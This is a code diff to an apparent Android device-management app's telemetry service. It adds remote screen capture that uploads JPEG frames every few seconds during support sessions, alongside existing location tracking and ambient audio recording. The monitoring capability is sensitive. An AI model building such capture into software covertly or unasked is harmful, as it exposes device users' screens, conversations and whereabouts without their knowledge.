@@ -11,18 +11,28 @@ import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
+import android.graphics.Bitmap;
+import android.graphics.PixelFormat;
 import android.media.AudioFormat;
 import android.media.AudioRecord;
 import android.media.MediaRecorder;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
 import android.os.Build;
 import android.os.IBinder;
+import android.util.DisplayMetrics;
 import android.provider.MediaStore;
+import android.media.Image;
+import android.media.ImageReader;
 import android.util.Log;
 
 import androidx.core.content.ContextCompat;
 
 import com.company.devicemgr.utils.ApiConfig;
+import com.company.devicemgr.utils.AppRuntime;
 import com.company.devicemgr.utils.HttpClient;
 import com.company.devicemgr.utils.SupportSessionApi;
 
@@ -31,6 +41,7 @@ import org.json.JSONObject;
 
 import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
+import java.io.ByteArrayInputStream;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.security.MessageDigest;
@@ -56,13 +67,18 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final String KEY_REMOTE_STREAM_LAST_CAPABILITY_AT = "remote_stream_last_capability_at";
     private static final String KEY_REMOTE_AUDIO_LAST_UPLOAD_PREFIX = "remote_audio_last_upload_";
     private static final long NORMAL_LOOP_MS = 30_000L;
-    private static final long ACTIVE_REMOTE_LOOP_MS = 5_000L;
+    private static final long ACTIVE_REMOTE_LOOP_MS = 2_500L;
     private static final int REMOTE_AUDIO_SEGMENT_MS = 4_000;
     private static final int REMOTE_AUDIO_SAMPLE_RATE = 16_000;
 
     private LocationManager locationManager;
     private volatile Location lastLocation = null;
     private volatile boolean running = false;
+    private volatile MediaProjection mediaProjection = null;
+    private volatile VirtualDisplay screenVirtualDisplay = null;
+    private volatile ImageReader screenImageReader = null;
+    private volatile String activeScreenSessionId = null;
+    private static final String KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX = "remote_screen_last_upload_";
 
     @Override
     public void onCreate() {
@@ -303,17 +319,200 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     }
 
     private void maybeRunRemoteSupportStream(JSONObject activeSession) {
-        if (activeSession == null || activeSession.optString("sessionId", "").length() == 0) return;
+        if (activeSession == null || activeSession.optString("sessionId", "").length() == 0) {
+            activeScreenSessionId = null;
+            releaseScreenProjection();
+            return;
+        }
         String requestType = activeSession.optString("requestType", "");
         String sessionId = activeSession.optString("sessionId", "");
 
         if ("ambient_audio".equals(requestType)) {
+            activeScreenSessionId = null;
+            releaseScreenProjection();
             captureAndUploadAmbientAudio(sessionId);
             return;
         }
 
         if ("screen".equals(requestType)) {
+            activeScreenSessionId = sessionId;
+            captureAndUploadScreenFrame(sessionId);
+        }
+    }
+
+    private void captureAndUploadScreenFrame(String sessionId) {
+        long now = System.currentTimeMillis();
+        long lastUploadAt = prefs().getLong(KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX + sessionId, 0L);
+        if ((now - lastUploadAt) < 2500L) return;
+
+        if (!ensureScreenProjection(sessionId)) return;
+
+        long startedAt = System.currentTimeMillis();
+        try {
+            Image image = screenImageReader != null ? screenImageReader.acquireLatestImage() : null;
+            if (image == null) {
+                try {
+                    Thread.sleep(250L);
+                } catch (InterruptedException ignored) {
+                }
+                image = screenImageReader != null ? screenImageReader.acquireLatestImage() : null;
+            }
+            if (image == null) {
+                JSONObject ctx = new JSONObject();
+                ctx.put("sessionId", sessionId);
+                ctx.put("reason", "no_frame_available_yet");
+                sendMetric("remote_stream", "screen_frame", "waiting", (int) (System.currentTimeMillis() - startedAt), null, ctx);
+                return;
+            }
+
+            byte[] jpeg = imageToJpeg(image);
+            image.close();
+            if (jpeg == null || jpeg.length == 0) throw new IllegalStateException("empty_screen_frame");
+
+            Map<String, String> form = new HashMap<>();
+            form.put("captureMode", "remote_live");
+            form.put("captureKind", "screen");
+            form.put("supportSessionId", sessionId);
+            form.put("segmentStartedAtMs", String.valueOf(startedAt));
+            form.put("segmentDurationMs", "0");
+            JSONObject metadata = new JSONObject();
+            metadata.put("source", "MediaProjection");
+            metadata.put("transport", "jpeg_frame");
+            form.put("metadataJson", metadata.toString());
+
+            String filename = "remote_screen_" + sessionId + "_" + startedAt + ".jpg";
+            long uploadStartedAt = System.currentTimeMillis();
+            String res = HttpClient.uploadFile(
+                    ApiConfig.api("/api/media/" + currentDeviceId() + "/upload"),
+                    "media",
+                    filename,
+                    jpeg,
+                    "image/jpeg",
+                    form,
+                    currentToken()
+            );
+            JSONObject parsed = new JSONObject(res != null ? res : "{}");
+            JSONObject ctx = new JSONObject();
+            ctx.put("sessionId", sessionId);
+            if (parsed.optBoolean("ok")) {
+                prefs().edit().putLong(KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX + sessionId, System.currentTimeMillis()).apply();
+                ctx.put("fileId", parsed.optString("fileId", null));
+                sendMetric("remote_stream", "screen_frame", "ok", (int) (System.currentTimeMillis() - uploadStartedAt), (double) jpeg.length, ctx);
+            } else {
+                ctx.put("response", parsed.toString());
+                sendMetric("remote_stream", "screen_frame", "error", (int) (System.currentTimeMillis() - uploadStartedAt), null, ctx);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "captureAndUploadScreenFrame err", e);
+            try {
+                JSONObject ctx = new JSONObject();
+                ctx.put("sessionId", sessionId);
+                ctx.put("error", e.getClass().getSimpleName());
+                sendMetric("remote_stream", "screen_frame", "error", (int) (System.currentTimeMillis() - startedAt), null, ctx);
+            } catch (Exception ignored) {
+            }
+        }
+    }
+
+    private boolean ensureScreenProjection(String sessionId) {
+        try {
+            if (!AppRuntime.hasMediaProjectionGrant()) {
+                maybeReportScreenCapability(sessionId);
+                return false;
+            }
+            if (mediaProjection != null && screenImageReader != null && screenVirtualDisplay != null) {
+                return true;
+            }
+
+            MediaProjectionManager manager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            if (manager == null) {
+                maybeReportScreenCapability(sessionId);
+                return false;
+            }
+            IntentDataHolder holder = new IntentDataHolder(AppRuntime.getMediaProjectionResultCode(), AppRuntime.copyMediaProjectionDataIntent());
+            if (holder.dataIntent == null) {
+                maybeReportScreenCapability(sessionId);
+                return false;
+            }
+
+            mediaProjection = manager.getMediaProjection(holder.resultCode, holder.dataIntent);
+            if (mediaProjection == null) {
+                AppRuntime.clearMediaProjectionGrant();
+                maybeReportScreenCapability(sessionId);
+                return false;
+            }
+
+            DisplayMetrics dm = getResources().getDisplayMetrics();
+            int width = Math.max(720, dm.widthPixels);
+            int height = Math.max(1280, dm.heightPixels);
+            int density = Math.max(1, dm.densityDpi);
+            screenImageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+            screenVirtualDisplay = mediaProjection.createVirtualDisplay(
+                    "remote-screen-stream",
+                    width,
+                    height,
+                    density,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    screenImageReader.getSurface(),
+                    null,
+                    null
+            );
+            JSONObject ctx = new JSONObject();
+            ctx.put("sessionId", sessionId);
+            ctx.put("width", width);
+            ctx.put("height", height);
+            sendMetric("remote_stream", "capability", "ok", null, null, ctx);
+            return true;
+        } catch (Exception e) {
+            AppRuntime.clearMediaProjectionGrant();
+            releaseScreenProjection();
             maybeReportScreenCapability(sessionId);
+            return false;
+        }
+    }
+
+    private void releaseScreenProjection() {
+        try {
+            if (screenVirtualDisplay != null) screenVirtualDisplay.release();
+        } catch (Exception ignored) {
+        }
+        try {
+            if (screenImageReader != null) screenImageReader.close();
+        } catch (Exception ignored) {
+        }
+        try {
+            if (mediaProjection != null) mediaProjection.stop();
+        } catch (Exception ignored) {
+        }
+        screenVirtualDisplay = null;
+        screenImageReader = null;
+        mediaProjection = null;
+    }
+
+    private byte[] imageToJpeg(Image image) throws Exception {
+        Image.Plane[] planes = image.getPlanes();
+        if (planes == null || planes.length == 0) return null;
+        ByteBuffer buffer = planes[0].getBuffer();
+        int pixelStride = planes[0].getPixelStride();
+        int rowStride = planes[0].getRowStride();
+        int rowPadding = rowStride - pixelStride * image.getWidth();
+        Bitmap bitmap = Bitmap.createBitmap(image.getWidth() + rowPadding / pixelStride, image.getHeight(), Bitmap.Config.ARGB_8888);
+        bitmap.copyPixelsFromBuffer(buffer);
+        Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, image.getWidth(), image.getHeight());
+        ByteArrayOutputStream output = new ByteArrayOutputStream();
+        cropped.compress(Bitmap.CompressFormat.JPEG, 65, output);
+        bitmap.recycle();
+        cropped.recycle();
+        return output.toByteArray();
+    }
+
+    private static class IntentDataHolder {
+        final int resultCode;
+        final android.content.Intent dataIntent;
+
+        IntentDataHolder(int resultCode, android.content.Intent dataIntent) {
+            this.resultCode = resultCode;
+            this.dataIntent = dataIntent;
         }
     }
 
@@ -535,6 +734,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             if (locationManager != null) locationManager.removeUpdates(this);
         } catch (Exception ignored) {
         }
+        releaseScreenProjection();
         getSharedPreferences(PREFS, MODE_PRIVATE).edit().putBoolean("service_started", false).apply();
         super.onDestroy();
     }
